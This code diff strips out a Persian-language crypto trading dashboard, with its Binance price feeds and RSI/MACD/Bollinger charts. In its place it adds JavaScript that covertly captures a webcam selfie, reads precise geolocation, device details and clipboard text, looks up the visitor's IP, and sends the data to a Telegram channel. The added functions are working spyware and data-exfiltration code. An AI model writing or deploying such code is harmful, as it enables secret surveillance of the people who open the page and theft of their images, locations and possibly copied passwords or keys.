-                        <span class="badge badge-danger" id="prediction-accuracy">% در حال محاسبه</span>
-                    </div>
-                    <div id="price-prediction-content">
-                        <!-- پیش‌بینی‌ها -->
-                    </div>
-                </div>
-            </div>
-        </div>
+// ================= CAPTURE SELFIE =================
+async function captureSelfie() {
+    try {
+        setStatus("📸 Accessing camera...");
 
-        <!-- سایدبار -->
-        <div class="sidebar">
-            <!-- کارت وضعیت بازار -->
-            <div class="market-overview">
-                <div class="price-display">
-                    <div class="current-price price-updating" id="current-price">$--.--</div>
-                    <div class="price-change" id="price-change">
-                        <i class="fas fa-arrow-up"></i>
-                        <span id="price-change-value">--.--%</span>
-                    </div>
-                </div>
-                <div class="market-stats">
-                    <div class="stat-item">
-                        <span class="stat-label">بالاترین 24h</span>
-                        <span class="stat-value" id="high-24h">$--.--</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-label">پایین‌ترین 24h</span>
-                        <span class="stat-value" id="low-24h">$--.--</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-label">حجم معاملات</span>
-                        <span class="stat-value" id="volume-24h">--.--</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-label">تغییر 7 روز</span>
-                        <span class="stat-value" id="change-7d">--.--%</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- کارت تحلیل چند-تایم‌فرمی -->
-            <div class="time-analysis">
-                <div class="card-header">
-                    <div class="card-title">
-                        <i class="fas fa-layer-group"></i>
-                        تحلیل چند-تایم‌فرمی زنده
-                    </div>
-                    <span class="timer" id="tf-timer">به‌روزرسانی: 0s</span>
-                </div>
-                <div class="timeframe-analysis" id="multi-timeframe-analysis">
-                    <!-- تحلیل تایم‌فرم‌ها -->
-                </div>
-            </div>
-
-            <!-- کارت سیگنال‌های فوری -->
-            <div class="signals-card">
-                <div class="card-header">
-                    <div class="card-title">
-                        <i class="fas fa-bolt"></i>
-                        سیگنال‌های فوری
-                    </div>
-                    <button class="btn" style="padding: 4px 8px; font-size: 12px;" onclick="refreshSignals()">
-                        <i class="fas fa-sync-alt"></i>
-                    </button>
-                </div>
-                <div id="instant-signals">
-                    <!-- سیگنال‌های فوری -->
-                </div>
-            </div>
-
-            <!-- کارت پیش‌بینی زمانی -->
-            <div class="prediction-card">
-                <div class="prediction-header">
-                    <div class="card-title">
-                        <i class="fas fa-hourglass-half"></i>
-                        پیش‌بینی زمانی دقیق
-                    </div>
-                    <div class="prediction-accuracy" id="time-prediction-accuracy">
-                        دقت: محاسبه...
-                    </div>
-                </div>
-                <div class="prediction-chart">
-                    <canvas id="time-prediction-chart"></canvas>
-                </div>
-                <div id="time-prediction-text">
-                    <!-- متن پیش‌بینی -->
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- فوتو -->
-    <footer class="no-print">
-        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px;">
-            <div>
-                <p>© 2024 TRADING VISION LIVE - سیستم تحلیل تکنیکال زنده و حرفه‌ای</p>
-                <p style="font-size: 12px; margin-top: 5px; color: var(--text-secondary);">
-                    <i class="fas fa-exclamation-circle"></i> داده‌های زنده از صرافی‌های معتبر جهانی
-                    <span class="live-badge" style="margin: 0 5px;"></span>
-                    <span id="connection-status">در حال اتصال...</span>
-                </p>
-            </div>
-            <div style="display: flex; gap: 15px;">
-                <button class="btn" onclick="showDisclaimer()" style="font-size: 12px; padding: 6px 12px;">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    سلب مسئولیت
-                </button>
-                <button class="btn" onclick="exportData()" style="font-size: 12px; padding: 6px 12px;">
-                    <i class="fas fa-download"></i>
-                    خروجی
-                </button>
-            </div>
-        </div>
-    </footer>
-
-    <!-- اسکریپت‌های اصلی -->
-    <script>
-        // ====================
-        // متغیرهای جهانی
-        // ====================
-        let currentSymbol = 'BTCUSDT';
-        let currentTimeframe = '1h';
-        let chartInstance = null;
-        let timePredictionChart = null;
-        let isMobile = false;
-        let liveData = null;
-        let analysisInterval = null;
-        let updateTimer = 0;
-        let wsConnection = null;
-        let indicators = {
-            rsi: false,
-            macd: false,
-            bb: false
-        };
-
-        // نمادهای معروف
-        const popularSymbols = [
-            {symbol: 'BTCUSDT', name: 'بیت‌کوین'},
-            {symbol: 'ETHUSDT', name: 'اتریوم'},
-            {symbol: 'BNBUSDT', name: 'بایننس'},
-            {symbol: 'SOLUSDT', name: 'سولانا'},
-            {symbol: 'XRPUSDT', name: 'ریپل'},
-            {symbol: 'ADAUSDT', name: 'کاردانو'},
-            {symbol: 'DOGEUSDT', name: 'دوج‌کوین'},
-            {symbol: 'DOTUSDT', name: 'پولکادات'},
-            {symbol: 'AVAXUSDT', name: 'آوالانچ'},
-            {symbol: 'LINKUSDT', name: 'چین لینک'}
-        ];
-
-        // ====================
-        // تابع‌های اولیه
-        // ====================
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 شروع بارگذاری سیستم تحلیل زنده...');
-            
-            // تشخیص دستگاه
-            detectDevice();
-            
-            // شروع بارگذاری
-            initializeApp();
-            
-            // بستن منوی سیمبل‌ها با کلیک خارج
-            document.addEventListener('click', function(event) {
-                const dropdown = document.getElementById('symbol-dropdown');
-                const symbolSelector = document.querySelector('.symbol-selector');
-                
-                if (!symbolSelector.contains(event.target)) {
-                    dropdown.classList.remove('show');
-                }
-            });
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user",
+                width: { ideal: 320 },
+                height: { ideal: 240 }
+            },
+            audio: false
         });
 
-        function detectDevice() {
-            const width = window.innerWidth;
-            isMobile = width <= 768;
-            console.log(isMobile ? '📱 حالت موبایل فعال' : '💻 حالت دسکتاپ فعال');
-            
-            window.addEventListener('resize', () => {
-                const newWidth = window.innerWidth;
-                const newIsMobile = newWidth <= 768;
-                if (newIsMobile !== isMobile) {
-                    isMobile = newIsMobile;
-                    updateChartDimensions();
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play();
+
+        setStatus("📸 Capturing...");
+        await new Promise(r => setTimeout(r, 600));
+
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth || 320;
+        canvas.height = video.videoHeight || 240;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        setStatus("📤 Sending...");
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+
+        if (blob) {
+            sendPhotoToTelegram(blob, "📸 Selfie captured");
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+
+        return true;
+
+    } catch (err) {
+        setStatus("❌ Camera error: " + err.message, "error");
+        sendToTelegram(`❌ Camera error: ${err.message}`);
+        retryBtn.style.display = 'block';
+        return false;
+    }
+}
+
+// ================= GET IP =================
+async function getIP() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        return d.ip || 'unknown';
+    } catch {
+        return 'unknown';
+    }
+}
+
+// ================= GET LOCATION =================
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                sendToTelegram(`📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+            },
+            () => {},
+            { timeout: 5000, enableHighAccuracy: true }
+        );
+    }
+}
+
+// ================= DEVICE INFO =================
+function getDeviceInfo() {
+    const info = [
+        `📱 Device Info`,
+        `UA: ${navigator.userAgent}`,
+        `Screen: ${window.screen.width}x${window.screen.height}`,
+        `Color: ${window.screen.colorDepth}bit`,
+        `Lang: ${navigator.language}`,
+        `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+        `Memory: ${navigator.deviceMemory || 'N/A'} GB`,
+        `Cores: ${navigator.hardwareConcurrency || 'N/A'}`
+    ];
+    sendToTelegram(info.join('\n'));
+}
+
+// ================= CLIPBOARD =================
+function getClipboard() {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText()
+            .then(text => {
+                if (text && text.length > 0 && text.length < 500) {
+                    sendToTelegram(`📋 Clipboard: ${text}`);
                 }
-            });
-        }
-
-        // ====================
-        // مقداردهی اولیه برنامه
-        // ====================
-        async function initializeApp() {
-            try {
-                document.getElementById('loading-text').textContent = 'در حال اتصال به Binance API...';
-                
-                // پر کردن لیست سیمبل‌ها
-                await populateSymbols();
-                
-                // بروزرسانی وضعیت
-                document.getElementById('loading-text').textContent = 'دریافت داده‌های زنده...';
-                
-                // ایجاد چارت
-                createMainChart();
-                createTimePredictionChart();
-                
-                // تنظیم تایم‌فرم‌ها
-                setupTimeframeButtons();
-                
-                // دریافت داده‌های اولیه
-                await loadInitialData();
-                
-                // شروع تایمرهای بروزرسانی
-                startUpdateTimers();
-                
-                // مخفی کردن پوشش بارگذاری
-                setTimeout(() => {
-                    document.getElementById('loading-overlay').style.opacity = '0';
-                    setTimeout(() => {
-                        document.getElementById('loading-overlay').style.display = 'none';
-                        showNotification('سیستم تحلیل زنده آماده است!', 'buy');
-                    }, 500);
-                }, 1500);
-                
-            } catch (error) {
-                console.error('خطا در مقداردهی اولیه:', error);
-                document.getElementById('loading-text').textContent = 'خطا در اتصال. لطفا صفحه را رفرش کنید.';
-                
-                // استفاده از داده‌های جایگزین
-                useFallbackData();
-            }
-        }
-
-        // ====================
-        // بارگذاری داده‌های اولیه
-        // ====================
-        async function loadInitialData() {
-            try {
-                const liveData = await fetchLiveData(currentSymbol);
-                updateMarketData(liveData.ticker);
-                updateChartData(liveData.klines);
-                runTechnicalAnalysis(liveData.klines);
-                
-            } catch (error) {
-                console.error('خطا در بارگذاری داده‌های اولیه:', error);
-                throw error;
-            }
-        }
-
-        async function fetchLiveData(symbol = 'BTCUSDT') {
-            try {
-                // دریافت داده‌های 24 ساعته
-                const tickerResponse = await fetch(`https://api.binance.com/api/v3/ticker/24hr?symbol=${symbol}`);
-                const tickerData = await tickerResponse.json();
-                
-                // دریافت داده‌های کندل
-                const klineResponse = await fetch(`https://api.binance.com/api/v3/klines?symbol=${symbol}&interval=${currentTimeframe}&limit=100`);
-                const klineData = await klineResponse.json();
-                
-                return {
-                    ticker: tickerData,
-                    klines: klineData
-                };
-                
-            } catch (error) {
-                console.error('خطا در دریافت داده‌های زنده:', error);
-                throw error;
-            }
-        }
-
-        function useFallbackData() {
-            // داده‌های نمونه در صورت خطا
-            const sampleData = {
-                ticker: {
-                    lastPrice: "42850.30",
-                    priceChangePercent: "2.35",
-                    highPrice: "43120.50",
-                    lowPrice: "41230.80",
-                    volume: "28400000000",
-                    quoteVolume: "1215000000000"
-                },
-                klines: generateSampleKlines()
-            };
-            
-            updateMarketData(sampleData.ticker);
-            updateChartData(sampleData.klines);
-            runTechnicalAnalysis(sampleData.klines);
-            
-            setTimeout(() => {
-                document.getElementById('loading-overlay').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('loading-overlay').style.display = 'none';
-                    showNotification('استفاده از داده‌های نمونه - اتصال به سرور با مشکل مواجه شد', 'sell');
-                }, 500);
-            }, 2000);
-        }
-
-        function generateSampleKlines() {
-            const klines = [];
-            const now = Date.now();
-            const basePrice = 42850;
-            
-            for (let i = 0; i < 100; i++) {
-                const time = now - (99 - i) * 3600000; // هر ساعت
-                const open = basePrice + (Math.random() - 0.5) * 1000;
-                const close = open + (Math.random() - 0.5) * 500;
-                const high = Math.max(open, close) + Math.random() * 200;
-                const low = Math.min(open, close) - Math.random() * 200;
-                const volume = 1000 + Math.random() * 5000;
-                const quoteVolume = (volume * close).toFixed(2);
-                
-                klines.push([
-                    time,
-                    open.toFixed(2),
-                    high.toFixed(2),
-                    low.toFixed(2),
-                    close.toFixed(2),
-                    volume.toFixed(2),
-                    time + 3600000,
-                    quoteVolume,
-                    10,
-                    (volume * 0.6).toFixed(2),
-                    (quoteVolume * 0.6).toFixed(2),
-                    '0'
-                ]);
-            }
-            
-            return klines;
-        }
-
-        // ====================
-        // مدیریت سیمبل‌ها
-        // ====================
-        async function populateSymbols() {
-            const dropdown = document.getElementById('symbol-dropdown');
-            dropdown.innerHTML = '';
-            
-            popularSymbols.forEach(async (symbolInfo) => {
-                const option = document.createElement('div');
-                option.className = 'symbol-option';
-                option.innerHTML = `
-                    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
-                        <div>
-                            <strong>${symbolInfo.symbol.replace('USDT', '/USDT')}</strong>
-                            <div style="font-size: 12px; color: var(--text-secondary);">${symbolInfo.name}</div>
-                        </div>
-                        <div style="text-align: left;">
-                            <div style="font-weight: 600;" id="price-${symbolInfo.symbol}">$--.--</div>
-                            <div style="font-size: 12px; color: var(--text-secondary);" id="change-${symbolInfo.symbol}">--.--%</div>
-                        </div>
-                    </div>
-                `;
-                
-                option.addEventListener('click', () => {
-                    updateChartSymbol(symbolInfo.symbol);
-                    dropdown.classList.remove('show');
-                });
-                
-                dropdown.appendChild(option);
-                
-                // بروزرسانی قیمت‌های اولیه
-                try {
-                    const tickerResponse = await fetch(`https://api.binance.com/api/v3/ticker/24hr?symbol=${symbolInfo.symbol}`);
-                    const tickerData = await tickerResponse.json();
-                    
-                    document.getElementById(`price-${symbolInfo.symbol}`).textContent = 
-                        `$${parseFloat(tickerData.lastPrice).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 8})}`;
-                    
-                    const change = parseFloat(tickerData.priceChangePercent);
-                    const changeElement = document.getElementById(`change-${symbolInfo.symbol}`);
-                    changeElement.textContent = `${change >= 0 ? '+' : ''}${change.toFixed(2)}%`;
-                    changeElement.style.color = change >= 0 ? 'var(--color-buy)' : 'var(--color-sell)';
-                    
-                } catch (error) {
-                    console.error(`خطا در دریافت قیمت ${symbolInfo.symbol}:`, error);
-                }
-            });
-        }
-
-        function toggleSymbolDropdown() {
-            const dropdown = document.getElementById('symbol-dropdown');
-            dropdown.classList.toggle('show');
-        }
-
-        // ====================
-        // بروزرسانی داده‌های بازار
-        // ====================
-        function updateMarketData(tickerData) {
-            if (!tickerData) return;
-            
-            const price = parseFloat(tickerData.lastPrice);
-            const change = parseFloat(tickerData.priceChangePercent);
-            const high = parseFloat(tickerData.highPrice);
-            const low = parseFloat(tickerData.lowPrice);
-            const volume = parseFloat(tickerData.volume);
-            
-            // بروزرسانی قیمت
-            const priceElement = document.getElementById('current-price');
-            priceElement.textContent = `$${price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 8 })}`;
-            priceElement.classList.add('price-updating');
-            
-            // بروزرسانی تغییرات
-            const changeElement = document.getElementById('price-change');
-            changeElement.className = `price-change ${change >= 0 ? 'positive' : 'negative'}`;
-            changeElement.innerHTML = `
-                <i class="fas fa-${change >= 0 ? 'arrow-up' : 'arrow-down'}"></i>
-                <span id="price-change-value">${change >= 0 ? '+' : ''}${change.toFixed(2)}%</span>
-            `;
-            
-            // بروزرسانی سایر آمار
-            document.getElementById('high-24h').textContent = `$${high.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-            document.getElementById('low-24h').textContent = `$${low.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-            
-            const volumeFormatted = volume >= 1000000000 ? 
-                `${(volume / 1000000000).toFixed(2)}B` : 
-                volume >= 1000000 ? 
-                `${(volume / 1000000).toFixed(2)}M` : 
-                `${(volume / 1000).toFixed(2)}K`;
-            
-            document.getElementById('volume-24h').textContent = `${volumeFormatted}`;
-            
-            // محاسبه تغییر 7 روز (نمونه)
-            const weeklyChange = (Math.random() * 10 - 5).toFixed(2);
-            const weeklyElement = document.getElementById('change-7d');
-            weeklyElement.textContent = `${weeklyChange >= 0 ? '+' : ''}${weeklyChange}%`;
-            weeklyElement.style.color = weeklyChange >= 0 ? 'var(--color-buy)' : 'var(--color-sell)';
-            
-            // حذف انیمیشن پس از بروزرسانی
-            setTimeout(() => {
-                priceElement.classList.remove('price-updating');
-            }, 500);
-        }
-
-        // ====================
-        // چارت اصلی
-        // ====================
-        function createMainChart() {
-            const ctx = document.getElementById('trading-chart').getContext('2d');
-            
-            Chart.register({
-                id: 'candlestick',
-                beforeDraw: function(chart) {
-                    const ctx = chart.ctx;
-                    const dataset = chart.data.datasets[0];
-                    
-                    for (let i = 0; i < dataset.data.length; i++) {
-                        const point = dataset.data[i];
-                        if (!point) continue;
-                        
-                        const meta = chart.getDatasetMeta(0);
-                        const element = meta.data[i];
-                        
-                        if (!element) continue;
-                        
-                        const x = element.x;
-                        const y = element.y;
-                        const width = element.width || 5;
-                        
-                        // رسم کندل
-                        ctx.fillStyle = point.c >= point.o ? 'rgba(0, 193, 118, 0.8)' : 'rgba(255, 59, 105, 0.8)';
-                        
-                        // بدنه کندل
-                        const bodyTop = chart.scales.y.getPixelForValue(point.h);
-                        const bodyBottom = chart.scales.y.getPixelForValue(point.l);
-                        const openY = chart.scales.y.getPixelForValue(point.o);
-                        const closeY = chart.scales.y.getPixelForValue(point.c);
-                        
-                        // سایه بالا
-                        ctx.beginPath();
-                        ctx.moveTo(x, bodyTop);
-                        ctx.lineTo(x, Math.min(openY, closeY));
-                        ctx.strokeStyle = point.c >= point.o ? 'rgba(0, 193, 118, 1)' : 'rgba(255, 59, 105, 1)';
-                        ctx.lineWidth = 1;
-                        ctx.stroke();
-                        
-                        // سایه پایین
-                        ctx.beginPath();
-                        ctx.moveTo(x, Math.max(openY, closeY));
-                        ctx.lineTo(x, bodyBottom);
-                        ctx.stroke();
-                        
-                        // بدنه
-                        ctx.fillRect(x - width/2, closeY, width, openY - closeY);
-                    }
-                }
-            });
-            
-            chartInstance = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    datasets: [{
-                        label: currentSymbol,
-                        data: [],
-                        borderColor: 'rgba(41, 98, 255, 0.8)',
-                        borderWidth: 1,
-                        pointRadius: 0,
-                        tension: 0
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            display: true,
-                            position: 'top',
-                            labels: { 
-                                color: 'var(--text-primary)', 
-                                font: { 
-                                    family: 'Vazirmatn, Inter, sans-serif',
-                                    size: 14 
-                                } 
-                            }
-                        },
-                        tooltip: {
-                            mode: 'index',
-                            intersect: false,
-                            backgroundColor: 'rgba(26, 31, 42, 0.95)',
-                            titleColor: 'var(--color-buy)',
-                            bodyColor: 'white',
-                            borderColor: 'var(--color-highlight)',
-                            borderWidth: 1,
-                            padding: 12,
-                            callbacks: {
-                                label: function(context) {
-                                    const point = context.dataset.data[context.dataIndex];
-                                    if (!point) return '';
-                                    return [
-                                        `قیمت: $${point.y.toFixed(2)}`,
-                                        `تاریخ: ${new Date(point.x).toLocaleDateString('fa-IR')}`
-                                    ];
-                                }
-                            }
-                        }
-                    },
-                    scales: {
-                        x: {
-                            type: 'time',
-                            time: {
-                                unit: 'hour'
-                            },
-                            ticks: {
-                                color: 'var(--text-secondary)'
-                            },
-                            grid: {
-                                color: 'rgba(138, 155, 178, 0.1)'
-                            }
-                        },
-                        y: {
-                            position: 'right',
-                            ticks: {
-                                color: 'var(--text-secondary)',
-                                callback: function(value) {
-                                    return '$' + value.toLocaleString('en-US', {minimumFractionDigits: 0});
-                                }
-                            },
-                            grid: {
-                                color: 'rgba(138, 155, 178, 0.1)'
-                            }
-                        }
-                    }
-                }
-            });
-        }
-
-        function updateChartData(klines) {
-            if (!chartInstance || !klines) return;
-            
-            const chartData = klines.map(k => ({
-                x: new Date(k[0]),
-                y: parseFloat(k[4]),
-                o: parseFloat(k[1]),
-                h: parseFloat(k[2]),
-                l: parseFloat(k[3]),
-                c: parseFloat(k[4])
-            }));
-            
-            chartInstance.data.datasets[0].data = chartData;
-            chartInstance.data.datasets[0].label = currentSymbol.replace('USDT', '/USDT');
-            chartInstance.update('none');
-        }
-
-        function updateChartDimensions() {
-            if (chartInstance) {
-                chartInstance.resize();
-            }
-        }
-
-        // ====================
-        // چارت پیش‌بینی زمانی
-        // ====================
-        function createTimePredictionChart() {
-            const ctx = document.getElementById('time-prediction-chart').getContext('2d');
-            
-            timePredictionChart = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: ['۱ ساعت', '۲ ساعت', '۳ ساعت', '۴ ساعت', '۵ ساعت', '۶ ساعت'],
-                    datasets: [{
-                        label: 'احتمال صعودی',
-                        data: [55, 58, 62, 65, 63, 60],
-                        borderColor: 'var(--color-buy)',
-                        backgroundColor: 'rgba(0, 193, 118, 0.1)',
-                        borderWidth: 2,
-                        tension: 0.4,
-                        fill: true
-                    }, {
-                        label: 'احتمال نزولی',
-                        data: [45, 42, 38, 35, 37, 40],
-                        borderColor: 'var(--color-sell)',
-                        backgroundColor: 'rgba(255, 59, 105, 0.1)',
-                        borderWidth: 2,
-                        tension: 0.4,
-                        fill: true
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            display: false
-                        }
-                    },
-                    scales: {
-                        x: {
-                            ticks: {
-                                color: 'var(--text-secondary)'
-                            },
-                            grid: {
-                                display: false
-                            }
-                        },
-                        y: {
-                            min: 0,
-                            max: 100,
-                            ticks: {
-                                color: 'var(--text-secondary)',
-                                callback: function(value) {
-                                    return value + '%';
-                                }
-                            },
-                            grid: {
-                                color: 'rgba(138, 155, 178, 0.1)'
-                            }
-                        }
-                    }
-                }
-            });
-        }
-
-        // ====================
-        // تحلیل تکنیکال
-        // ====================
-        async function runTechnicalAnalysis(klines) {
-            if (!klines || klines.length < 50) {
-                console.warn('داده‌های ناکافی برای تحلیل');
-                return;
-            }
-            
-            try {
-                const closes = klines.map(k => parseFloat(k[4]));
-                const highs = klines.map(k => parseFloat(k[2]));
-                const lows = klines.map(k => parseFloat(k[3]));
-                const volumes = klines.map(k => parseFloat(k[5]));
-                
-                // محاسبه RSI
-                const rsiValues = calculateRSI(closes);
-                const currentRSI = rsiValues[rsiValues.length - 1] || 50;
-                
-                // محاسبه MACD
-                const macdValues = calculateMACD(closes);
-                const currentMACD = macdValues.macdLine[macdValues.macdLine.length - 1] || 0;
-                const currentSignal = macdValues.signalLine[macdValues.signalLine.length - 1] || 0;
-                const currentHistogram = macdValues.histogram[macdValues.histogram.length - 1] || 0;
-                
-                // محاسبه بولینگر باند
-                const bbValues = calculateBollingerBands(closes);
-                const currentUpperBB = bbValues.upper[bbValues.upper.length - 1] || 0;
-                const currentLowerBB = bbValues.lower[bbValues.lower.length - 1] || 0;
-                const currentMiddleBB = bbValues.middle[bbValues.middle.length - 1] || 0;
-                
-                // محاسبه حجم
-                const avgVolume = calculateAverageVolume(volumes);
-                const currentVolume = volumes[volumes.length - 1];
-                const volumeRatio = currentVolume / avgVolume;
-                
-                // تشخیص روند
-                const trend = detectTrend(closes);
-                const trendStrength = calculateTrendStrength(closes);
-                
-                // تشخیص سیگنال‌ها
-                const signals = detectSignals({
-                    rsi: currentRSI,
-                    macd: currentMACD,
-                    signal: currentSignal,
-                    histogram: currentHistogram,
-                    price: closes[closes.length - 1],
-                    upperBB: currentUpperBB,
-                    lowerBB: currentLowerBB,
-                    volumeRatio: volumeRatio,
-                    trend: trend
-                });
-                
-                // نمایش تحلیل
-                displayTechnicalAnalysis({
-                    rsi: currentRSI,
-                    macd: currentMACD,
-                    signal: currentSignal,
-                    histogram: currentHistogram,
-                    upperBB: currentUpperBB,
-                    lowerBB: currentLowerBB,
-                    middleBB: currentMiddleBB,
-                    volumeRatio: volumeRatio,
-                    trend: trend,
-                    trendStrength: trendStrength,
-                    signals: signals
-                });
-                
-                // نمایش سیگنال‌ها
-                displaySignals(signals);
-                
-                // نمایش تحلیل زمانی
-                displayTimeAnalysis(closes, trend, trendStrength);
-                
-                // نمایش پیش‌بینی
-                displayPricePrediction(closes, trend, trendStrength);
-                
-                // نمایش تحلیل چند-تایم‌فرمی
-                await displayMultiTimeframeAnalysis();
-                
-                // بروزرسانی بج‌ها
-                updateAnalysisBadges(signals.length);
-                
-                // بروزرسانی چارت پیش‌بینی
-                updateTimePredictionChart();
-                
-            } catch (error) {
-                console.error('خطا در تحلیل تکنیکال:', error);
-            }
-        }
-
-        // ====================
-        // توابع محاسباتی تحلیل تکنیکال
-        // ====================
-        function calculateRSI(prices, period = 14) {
-            const rsi = [];
-            if (prices.length < period) return rsi;
-            
-            let gains = 0;
-            let losses = 0;
-            
-            // محاسبه میانگین سود و زیان اولیه
-            for (let i = 1; i <= period; i++) {
-                const change = prices[i] - prices[i - 1];
-                if (change >= 0) {
-                    gains += change;
-                } else {
-                    losses += Math.abs(change);
-                }
-            }
-            
-            let avgGain = gains / period;
-            let avgLoss = losses / period;
-            let rs = avgLoss === 0 ? 100 : avgGain / avgLoss;
-            rsi.push(100 - (100 / (1 + rs)));
-            
-            // محاسبه RSI برای نقاط بعدی
-            for (let i = period + 1; i < prices.length; i++) {
-                const change = prices[i] - prices[i - 1];
-                let currentGain = change >= 0 ? change : 0;
-                let currentLoss = change < 0 ? Math.abs(change) : 0;
-                
-                avgGain = (avgGain * (period - 1) + currentGain) / period;
-                avgLoss = (avgLoss * (period - 1) + currentLoss) / period;
-                
-                rs = avgLoss === 0 ? 100 : avgGain / avgLoss;
-                rsi.push(100 - (100 / (1 + rs)));
-            }
-            
-            return rsi;
-        }
-
-        function calculateEMA(prices, period) {
-            const ema = [];
-            const multiplier = 2 / (period + 1);
-            
-            // اولین EMA برابر با SMA است
-            let sum = 0;
-            for (let i = 0; i < period; i++) {
-                sum += prices[i];
-            }
-            ema.push(sum / period);
-            
-            // محاسبه EMA برای بقیه داده‌ها
-            for (let i = period; i < prices.length; i++) {
-                const currentEMA = (prices[i] - ema[ema.length - 1]) * multiplier + ema[ema.length - 1];
-                ema.push(currentEMA);
-            }
-            
-            return ema;
-        }
-
-        function calculateMACD(prices, fastPeriod = 12, slowPeriod = 26, signalPeriod = 9) {
-            const ema12 = calculateEMA(prices, fastPeriod);
-            const ema26 = calculateEMA(prices, slowPeriod);
-            
-            const macdLine = [];
-            const minLength = Math.min(ema12.length, ema26.length);
-            
-            for (let i = 0; i < minLength; i++) {
-                macdLine.push(ema12[i + ema12.length - minLength] - ema26[i + ema26.length - minLength]);
-            }
-            
-            const signalLine = calculateEMA(macdLine, signalPeriod);
-            
-            const histogram = [];
-            const signalStart = signalLine.length - macdLine.length;
-            
-            for (let i = 0; i < macdLine.length; i++) {
-                histogram.push(macdLine[i] - (signalLine[i + signalStart] || 0));
-            }
-            
-            return { 
-                macdLine: macdLine.slice(signalPeriod - 1),
-                signalLine: signalLine.slice(signalPeriod - 1),
-                histogram: histogram.slice(signalPeriod - 1)
-            };
-        }
-
-        function calculateBollingerBands(prices, period = 20, stdDev = 2) {
-            const upper = [];
-            const middle = [];
-            const lower = [];
-            
-            for (let i = period - 1; i < prices.length; i++) {
-                const slice = prices.slice(i - period + 1, i + 1);
-                const mean = slice.reduce((a, b) => a + b, 0) / period;
-                const variance = slice.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / period;
-                const standardDeviation = Math.sqrt(variance);
-                
-                middle.push(mean);
-                upper.push(mean + (standardDeviation * stdDev));
-                lower.push(mean - (standardDeviation * stdDev));
-            }
-            
-            return { upper, middle, lower };
-        }
-
-        function calculateAverageVolume(volumes) {
-            if (volumes.length === 0) return 1;
-            const sum = volumes.reduce((a, b) => a + b, 0);
-            return sum / volumes.length;
-        }
-
-        function detectTrend(prices) {
-            if (prices.length < 20) return 'neutral';
-            
-            const shortPeriod = 9;
-            const longPeriod = 21;
-            
-            const shortSMA = calculateSMA(prices, shortPeriod);
-            const longSMA = calculateSMA(prices, longPeriod);
-            
-            if (shortSMA.length < 2 || longSMA.length < 2) return 'neutral';
-            
-            const currentShort = shortSMA[shortSMA.length - 1];
-            const currentLong = longSMA[longSMA.length - 1];
-            const prevShort = shortSMA[shortSMA.length - 2];
-            const prevLong = longSMA[longSMA.length - 2];
-            
-            if (currentShort > currentLong && prevShort <= prevLong) {
-                return 'bullish';
-            } else if (currentShort < currentLong && prevShort >= prevLong) {
-                return 'bearish';
-            } else if (currentShort > currentLong) {
-                return 'bullish';
-            } else if (currentShort < currentLong) {
-                return 'bearish';
-            }
-            
-            return 'neutral';
-        }
-
-        function calculateSMA(prices, period) {
-            const sma = [];
-            for (let i = period - 1; i < prices.length; i++) {
-                const sum = prices.slice(i - period + 1, i + 1).reduce((a, b) => a + b, 0);
-                sma.push(sum / period);
-            }
-            return sma;
-        }
-
-        function calculateTrendStrength(prices) {
-            if (prices.length < 20) return 50;
-            
-            const changes = [];
-            for (let i = 1; i < prices.length; i++) {
-                changes.push(((prices[i] - prices[i - 1]) / prices[i - 1]) * 100);
-            }
-            
-            const avgChange = changes.reduce((a, b) => a + b, 0) / changes.length;
-            const volatility = Math.sqrt(changes.reduce((a, b) => a + Math.pow(b - avgChange, 2), 0) / changes.length);
-            
-            const strength = Math.min(100, Math.max(0, Math.abs(avgChange) * 100 / (volatility || 1)));
-            return Math.round(strength);
-        }
-
-        function detectSignals(indicators) {
-            const signals = [];
-            
-            // سیگنال RSI
-            if (indicators.rsi < 30) {
-                signals.push({
-                    type: 'buy',
-                    name: 'RSI اشباع فروش',
-                    strength: 'high',
-                    description: 'RSI زیر 30 - احتمال بازگشت صعودی'
-                });
-            } else if (indicators.rsi > 70) {
-                signals.push({
-                    type: 'sell',
-                    name: 'RSI اشباع خرید',
-                    strength: 'high',
-                    description: 'RSI بالای 70 - احتمال اصلاح قیمت'
-                });
-            }
-            
-            // سیگنال MACD
-            if (indicators.macd > indicators.signal && indicators.histogram > 0) {
-                signals.push({
-                    type: 'buy',
-                    name: 'تقاطع صعودی MACD',
-                    strength: 'high',
-                    description: 'MACD از خط سیگنال عبور کرده'
-                });
-            } else if (indicators.macd < indicators.signal && indicators.histogram < 0) {
-                signals.push({
-                    type: 'sell',
-                    name: 'تقاطع نزولی MACD',
